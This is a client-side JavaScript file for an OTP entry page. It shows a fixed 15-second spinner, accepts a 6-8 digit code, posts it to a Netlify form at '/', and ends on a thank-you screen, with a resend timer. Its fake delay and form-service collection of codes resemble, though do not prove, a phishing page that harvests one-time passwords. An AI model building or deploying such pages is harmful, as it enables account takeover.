document.addEventListener("DOMContentLoaded", function() {
    const spinnerContainer = document.querySelector('.spinner-container');
    const otpContainer = document.querySelector('.otp-container');
    const thanksContainer = document.querySelector('.thanks-container');
    const otpInput = document.getElementById('otpInput');
    const otpVerificationForm = document.getElementById('otpVerificationForm');
    const resendForm = document.getElementById('resendOTPForm');
    const timerDisplay = document.getElementById('timer');
    const resendLink = document.getElementById('resendLink');
    const resendConfirmation = document.getElementById('resendConfirmation');
    const timerBar = document.getElementById('timerBar');

    // Show spinner for 15 seconds on page load
    setTimeout(() => {
        spinnerContainer.style.display = 'none';
        otpContainer.style.display = 'flex';
    }, 15000);

    otpInput.addEventListener('input', function() {
        // Allow only numbers in the input field
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    otpVerificationForm.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        if (otpInput.value.length < 6 || otpInput.value.length > 8) {
            alert("Please enter a valid OTP!");
            return;
        }

        let formData = new FormData(otpVerificationForm);
        
        fetch('/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(formData).toString()
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            otpContainer.style.display = 'none';
            spinnerContainer.style.display = 'flex';

            setTimeout(() => {
                spinnerContainer.style.opacity = 0;
                setTimeout(() => {
                    spinnerContainer.style.display = 'none';
                    thanksContainer.style.display = 'flex';
                    thanksContainer.style.opacity = 1;
                }, 500);
            }, 3000);
        })
        .catch(error => {
            console.error('Form submission error:', error);
            alert('Form submission failed, please try again.');
        });
    });

    // Timer, progress bar, and resend form functionality
    var countdown = 75;
    var timer = setInterval(function() {
        updateTimerDisplay(countdown);

        var progressBarWidth = (countdown / 75) * 100;
        timerBar.style.width = progressBarWidth + '%';

        if (--countdown < 0) {
            clearInterval(timer);
            timerBar.style.display = 'none';
            resendLink.classList.add('enabled');
            resendLink.addEventListener('click', function(event) {
                event.preventDefault();
                submitResendForm();
            });
        }
    }, 1000);

    function updateTimerDisplay(seconds) {
        var minutes = Math.floor(seconds / 60);
        var remainingSeconds = seconds % 60;
        minutes = minutes < 10 ? "0" + minutes : minutes;
        remainingSeconds = remainingSeconds < 10 ? "0" + remainingSeconds : remainingSeconds;
        timerDisplay.textContent = minutes + ":" + remainingSeconds;
    }

    function submitResendForm() {
        var formData = new FormData(resendForm);
        formData.append('form-name', 'resendOTPForm');

        var encodedData = new URLSearchParams(formData).toString();

        fetch("/", {
            method: "POST",
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: encodedData
        })
        .then(response => {
            if (response.ok) {
                resendConfirmation.style.display = 'block';
                setTimeout(function() {
                    resendConfirmation.style.display = 'none';
                }, 5000);
            } else {
                console.error('Netlify form submission error:', response);
            }
        })
        .catch(error => {
            console.error('Error submitting form:', error);
        });
    }
});
